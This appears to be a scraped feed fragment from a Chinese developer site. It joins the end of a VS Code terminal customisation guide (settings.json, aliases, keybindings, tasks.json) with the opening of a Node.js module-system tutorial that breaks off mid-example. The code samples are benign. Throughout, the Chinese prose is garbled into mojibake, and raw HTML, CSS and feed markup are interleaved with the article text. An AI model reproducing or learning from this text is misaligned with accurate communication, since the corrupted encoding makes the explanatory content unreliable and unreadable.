<p>Shellé›†æˆè´¨é‡åˆ†ä¸º"æ— "ã€"ä¸°å¯Œ"å’Œ"åŸºæœ¬"ä¸‰ä¸ªç­‰çº§ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨ç»ˆç«¯é€‰é¡¹å¡ä¸Šå¯ä»¥æŸ¥çœ‹å½“å‰çš„é›†æˆè´¨é‡çŠ¶æ€ã€‚</p>
<h2 data-id="heading-3">å¤–è§‚è®¾ç½®</h2>
<p>VS Codeç»ˆç«¯çš„å¤–è§‚å¯ä»¥è¿›è¡Œå¹¿æ³›çš„è‡ªå®šä¹‰ï¼ŒåŒ…æ‹¬æ–‡æœ¬æ ·å¼ã€å…‰æ ‡æ ·å¼å’Œé€‰é¡¹å¡ç­‰ã€‚é€šè¿‡è°ƒæ•´è¿™äº›è®¾ç½®ï¼Œä½ å¯ä»¥æ‰“é€ ä¸€ä¸ªæ—¢ç¾è§‚åˆç¬¦åˆä¸ªäººä¹ æƒ¯çš„ç»ˆç«¯ç¯å¢ƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae78ca4728114d5d88c0be960dc88101~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765971132&amp;x-signature=h5QGs71bzL1R1B1B3xBrAw6u6bY%3D" alt="image.png" loading="lazy"/></p>
<p>å¸¸ç”¨å¤–è§‚è®¾ç½®ï¼ˆsettings.jsonï¼‰ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.fontFamily&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;'Fira Code'<span class="hljs-punctuation">,</span> 'Hack NF'<span class="hljs-punctuation">,</span> monospace&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.fontSize&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-number">14</span><span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.lineHeight&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-number">1.2</span><span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.cursorStyle&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;line&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.cursorWidth&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;terminal.integrated.cursorBlinking&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;workbench.colorCustomizations&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    &amp;#<span class="hljs-number">34</span>;terminal.background&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;#<span class="hljs-number">1e1</span>e1e&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
    &amp;#<span class="hljs-number">34</span>;terminal.foreground&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;#e0e0e0&amp;#<span class="hljs-number">34</span>;
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>Powerlineå’ŒNerd Fontsé…ç½®ï¼š</p>
<pre><code class="hljs language-json" lang="json">&amp;#<span class="hljs-number">34</span>;terminal.integrated.fontFamily&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;'DejaVu Sans Mono for Powerline'<span class="hljs-punctuation">,</span> 'Hack NF'&amp;#<span class="hljs-number">34</span>;
</code></pre>
<h2 data-id="heading-4">é«˜çº§åŠŸèƒ½</h2>
<p>VS Codeç»ˆç«¯æä¾›äº†è®¸å¤šé«˜çº§åŠŸèƒ½ï¼Œå¸®åŠ©ä½ è¿›ä¸€æ­¥æå‡å¼€å‘æ•ˆç‡ã€‚</p>
<h3 data-id="heading-5">æŒä¹…ä¼šè¯</h3>
<p>ç»ˆç«¯æ”¯æŒä¸¤ç§æŒä¹…ä¼šè¯ç±»å‹ï¼š</p>
<ul>
<li>è¿›ç¨‹é‡æ–°è¿æ¥ï¼šé‡æ–°åŠ è½½çª—å£æ—¶é‡æ–°è¿æ¥åˆ°å…ˆå‰çš„è¿›ç¨‹</li>
<li>è¿›ç¨‹æ¢å¤ï¼šé‡æ–°å¯åŠ¨VS Codeæ—¶æ¢å¤ç»ˆç«¯å†…å®¹å¹¶é‡æ–°å¯åŠ¨è¿›ç¨‹</li>
</ul>
<p>ç¦ç”¨æŒä¹…ä¼šè¯ï¼š</p>
<pre><code class="hljs language-json" lang="json">&amp;#<span class="hljs-number">34</span>;terminal.integrated.enablePersistentSessions&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
</code></pre>
<h3 data-id="heading-6">å‘½ä»¤åˆ«åè®¾ç½®</h3>
<p>é€šè¿‡shellé…ç½®æ–‡ä»¶å®ç°å¸¸ç”¨å‘½ä»¤çš„å¿«æ·æ–¹å¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Bash/Zshç”¨æˆ·ç¼–è¾‘~/.bashrcæˆ–~/.zshrc</span>
<span class="hljs-built_in">alias</span> ll=<span class="hljs-string">'ls -la'</span>
<span class="hljs-built_in">alias</span> gs=<span class="hljs-string">'git status'</span>
<span class="hljs-built_in">alias</span> gp=<span class="hljs-string">'git push'</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/787d064309364ed6968e86f8009678a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765971132&amp;x-signature=BjsdY09agq3FF9p5UzyLkJ4TOyc%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">è‡ªå®šä¹‰é”®ç›˜å¿«æ·é”®</h3>
<p>åœ¨keybindings.jsonä¸­é…ç½®ç»ˆç«¯å¿«æ·é”®ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  &amp;#<span class="hljs-number">34</span>;key&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;ctrl+shift+t&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;command&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;workbench.action.terminal.sendSequence&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;args&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> &amp;#<span class="hljs-number">34</span>;text&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;npm run dev\n&amp;#<span class="hljs-number">34</span>; <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-8">å¤šç»ˆç«¯ç®¡ç†</h3>
<ul>
<li>é‡å‘½åç»ˆç«¯ï¼šå³é”®ç»ˆç«¯é€‰é¡¹å¡ &gt; <strong>é‡å‘½å</strong></li>
<li>ç§»åŠ¨ç»ˆç«¯ï¼šæ‹–æ‹½ç»ˆç«¯é€‰é¡¹å¡åˆ°ç¼–è¾‘å™¨åŒºåŸŸæˆ–æ–°çª—å£</li>
<li>ç»ˆç«¯åˆ†ç»„ï¼šå³é”®ç»ˆç«¯ &gt; <strong>ç§»åŠ¨åˆ°æ–°ç»„</strong></li>
</ul>
<h3 data-id="heading-9">ä»»åŠ¡è‡ªåŠ¨åŒ–</h3>
<p>åœ¨å·¥ä½œåŒºæ ¹ç›®å½•åˆ›å»º <code>.vscode/tasks.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  &amp;#<span class="hljs-number">34</span>;version&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;<span class="hljs-number">2.0</span><span class="hljs-number">.0</span>&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
  &amp;#<span class="hljs-number">34</span>;tasks&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span>
      &amp;#<span class="hljs-number">34</span>;label&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;å¯åŠ¨å¼€å‘æœåŠ¡å™¨&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;type&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;shell&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;command&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;npm run dev&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;group&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        &amp;#<span class="hljs-number">34</span>;kind&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> &amp;#<span class="hljs-number">34</span>;build&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">,</span>
        &amp;#<span class="hljs-number">34</span>;isDefault&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      &amp;#<span class="hljs-number">34</span>;problemMatcher&amp;#<span class="hljs-number">34</span>;<span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>ä½¿ç”¨ <code>Ctrl+Shift+B</code> å¿«é€Ÿè¿è¡Œä»»åŠ¡ã€‚</p>
<p>VS Codeç»ˆç«¯ä¸ä»…ä»…æ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå·¥å…·ï¼Œå®ƒæ˜¯ä½ å¼€å‘å·¥ä½œæµçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚èŠ±æ—¶é—´é…ç½®å¥½ç»ˆç«¯ï¼Œæ¯å¤©èŠ‚çœçš„æ“ä½œæ—¶é—´ä¼šç´¯ç§¯æˆæ˜¾è‘—çš„æ•ˆç‡ä¼˜åŠ¿ã€‚æ— è®ºä½ æ˜¯åˆšå…¥é—¨çš„æ–°æ‰‹è¿˜æ˜¯ç»éªŒä¸°å¯Œçš„å¼€å‘è€…ï¼ŒæŒæ¡è¿™äº›ç»ˆç«¯æŠ€å·§éƒ½å°†ä½¿ä½ çš„VS Codeä½“éªŒæ›´åŠ æµç•…å’Œé«˜æ•ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js æ¨¡å—ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7582311711429345323</link>    <guid>https://juejin.cn/post/7582311711429345323</guid>    <pubDate>2025-12-11T07:59:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582311711429345323" data-draft-id="7582156219060699199" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js æ¨¡å—ç³»ç»Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-11T07:59:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¢¨å­åŒå¿—"/> <meta itemprop="url" content="https://juejin.cn/user/2084329779627965"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js æ¨¡å—ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2084329779627965/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¢¨å­åŒå¿—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:59:02.000Z" title="Thu Dec 11 2025 07:59:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ¨¡å—ç³»ç»Ÿæ¦‚è¿°</h2>
<p>Node.js æ”¯æŒä¸¤ç§æ¨¡å—ç³»ç»Ÿï¼š</p>
<ul>
<li><strong>CommonJS (CJS)</strong>ï¼šNode.js çš„é»˜è®¤æ¨¡å—ç³»ç»Ÿï¼Œä½¿ç”¨ <code>require</code> å’Œ <code>module.exports</code></li>
<li><strong>ES Modules (ESM)</strong>ï¼šJavaScript çš„å®˜æ–¹æ ‡å‡†æ¨¡å—ç³»ç»Ÿï¼Œä½¿ç”¨ <code>import</code> å’Œ <code>export</code></li>
</ul>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆéœ€è¦æ¨¡å—ç³»ç»Ÿï¼Ÿ</h3>
<p>æ¨¡å—ç³»ç»Ÿè§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li><strong>ä»£ç ç»„ç»‡</strong>ï¼šå°†ä»£ç æ‹†åˆ†ä¸ºå¯ç®¡ç†çš„å•å…ƒ</li>
<li><strong>å‘½åç©ºé—´éš”ç¦»</strong>ï¼šé¿å…å…¨å±€å˜é‡æ±¡æŸ“</li>
<li><strong>ä¾èµ–ç®¡ç†</strong>ï¼šæ˜ç¡®æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»</li>
<li><strong>ä»£ç å¤ç”¨</strong>ï¼šåœ¨ä¸åŒé¡¹ç›®ä¸­å…±äº«ä»£ç </li>
</ul>
<hr/>
<h2 data-id="heading-2">CommonJS æ¨¡å—ç³»ç»Ÿ</h2>
<p>CommonJS æ˜¯ Node.js æœ€æ—©é‡‡ç”¨çš„æ¨¡å—ç³»ç»Ÿï¼Œä¹Ÿæ˜¯é»˜è®¤çš„æ¨¡å—ç³»ç»Ÿã€‚æ¯ä¸ªæ–‡ä»¶è¢«è§†ä¸ºä¸€ä¸ªç‹¬ç«‹çš„æ¨¡å—ã€‚</p>
<h3 data-id="heading-3">åŸºæœ¬è¯­æ³•</h3>
<h4 data-id="heading-4">å¯¼å‡ºæ¨¡å—</h4>
<p>ä½¿ç”¨ <code>module.exports</code> å¯¼å‡ºæ¨¡å—å†…å®¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.js</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
    <span class="hljs-keyword">return</span> a + b;
  },
  <span class="hljs-attr">subtract</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
    <span class="hljs-keyword">return</span> a - b;
  }
};

<span class="hljs-comment">// æˆ–è€…ä½¿ç”¨ exports ç®€å†™ï¼ˆæ³¨æ„ï¼šä¸èƒ½ç›´æ¥èµ‹å€¼ç»™ exportsï¼‰</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">multiply</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-comment">// å¯¼å‡ºå•ä¸ªå‡½æ•°</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
};

<span class="hljs-comment">// å¯¼å‡ºç±»</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> {
  <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
    <span class="hljs-keyword">return</span> a + b;
  }
};
</code></pre>
<p><strong>é‡è¦æç¤º</strong>ï¼š</p>
<ul>
<li><code>module.exports</code> å’Œ <code>exports</code> æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡</li>
<li>ä¸èƒ½ç›´æ¥ç»™ <code>exports</code> èµ‹å€¼ï¼ˆå¦‚ <code>exports = {}</code>ï¼‰ï¼Œè¿™ä¸ä¼šæ”¹å˜ <code>module.exports</code></li>
<li>å¦‚æœè¦å¯¼å‡ºå•ä¸ªå€¼ï¼Œå¿…é¡»ä½¿ç”¨ <code>module.exports</code></li>
</ul>
<h4 data-id="heading-5">å¯¼å…¥æ¨¡å—</h4>
<p>ä½¿ç”¨ <code>require</code> å¯¼å…¥æ¨¡å—ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¯¼å…¥æœ¬åœ°æ¨¡å—ï¼ˆç›¸å¯¹è·¯å¾„ï¼‰</span>
<span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 5</span>

<span class="hljs-comment">// å¯¼å…¥æœ¬åœ°æ¨¡å—ï¼ˆç»å¯¹è·¯å¾„ï¼‰</span>
<span class="hljs-keyword">const</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">'/absolute/path/to/utils'</span>);

<span class="hljs-comment">// å¯¼å…¥å†…ç½®æ¨¡å—</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// å¯¼å…¥ node_modules ä¸­çš„åŒ…</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);

<span class="hljs-comment">// è§£æ„å¯¼å…¥</span>
<span class="hljs-keyword">const</span> { add, subtract } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);

<span class="hljs-comment">// å¯¼å…¥ JSON æ–‡ä»¶</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./config.json'</span>);
</code></pre>
<h3 data-id="heading-6">require çš„ç‰¹ç‚¹</h3>
<ol>
<li><strong>åŒæ­¥åŠ è½½</strong>ï¼š<code>require</code> æ˜¯åŒæ­¥çš„ï¼Œä¼šé˜»å¡ä»£ç æ‰§è¡Œç›´åˆ°æ¨¡å—åŠ è½½å®Œæˆ</li>
<li><strong>è¿è¡Œæ—¶åŠ è½½</strong>ï¼šæ¨¡å—åœ¨è¿è¡Œæ—¶è¢«åŠ è½½å’Œæ‰§è¡Œ</li>
<li><strong>åŠ¨æ€å¯¼å…¥</strong>ï¼šå¯ä»¥åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨ <code>require</code></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ç¤ºä¾‹</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'development'</span>) {
  <span class="hljs-keyword">const</span> devTools = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./dev-tools'</span>);
  devTools.<span class="hljs-title function_">enable</span>();
}

<span class="hljs-comment">// åœ¨å‡½æ•°ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadModule</span>(<span class="hljs-params">moduleName</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-built_in">require</span>(moduleName);
}
</code></pre>
<hr/>
<h2 data-id="heading-7">ES Modules (ESM)</h2>
<p>ES Modules æ˜¯ JavaScript çš„å®˜æ–¹æ ‡å‡†æ¨¡å—ç³»ç»Ÿï¼ŒNode.js ä» v12 å¼€å§‹æ­£å¼æ”¯æŒ ESMã€‚</p>
<h3 data-id="heading-8">å¯ç”¨ ESM</h3>
<p>æœ‰ä¸¤ç§æ–¹å¼å¯ç”¨ ESMï¼š</p>
<h4 data-id="heading-9">æ–¹å¼ 1ï¼šä½¿ç”¨ <code>.mjs</code> æ‰©å±•å</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.mjs</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// app.mjs</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">'./math.mjs'</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));
</code></pre>
<h4 data-id="heading-10">æ–¹å¼ 2ï¼šåœ¨ package.json ä¸­è®¾ç½® <code>"type": "module"</code></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-project"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"module"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"index.js"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>è®¾ç½®åï¼Œæ‰€æœ‰ <code>.js</code> æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œ ESM æ¨¡å—å¤„ç†ã€‚</p>
<h3 data-id="heading-11">åŸºæœ¬è¯­æ³•</h3>
<h4 data-id="heading-12">å¯¼å‡ºæ¨¡å—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// math.mjs</span>

<span class="hljs-comment">// å‘½åå¯¼å‡º</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
